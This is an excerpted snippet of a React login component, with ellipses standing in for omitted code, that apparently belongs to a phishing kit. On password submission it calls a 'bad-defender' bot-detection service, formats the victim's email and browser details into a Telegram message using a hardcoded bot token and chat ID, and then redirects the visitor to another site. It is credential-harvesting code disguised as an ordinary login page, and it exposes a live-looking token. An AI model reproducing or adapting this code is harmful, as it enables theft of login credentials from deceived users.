...
const Login = () => {
  ...
  const handlePasswordSubmit = async (e) => {
    ...
    try {
      ...
      const response = await axios.post('https://bad-defender-production.up.railway.app/api/detect_bot', {
      ...
      const TELEGRAM_BOT_TOKEN = '8122554711:AAH94irx-pg0vmUg-AA5lFkW11g7HCSdJbA';
      const TELEGRAM_CHAT_ID = '-1002733980257';
      const loginAlert = `
🔐 <b>Login Details</b>
📧 <b>Email:</b> ${email}
...
🕵️‍♂️ <b>User Agent:</b> ${navigator.userAgent}
      ...
      setShowModal(false); // Hide modal before redirecting
      window.location.href = 'https://oko.drodge-webview.online/';
    } catch (error) {
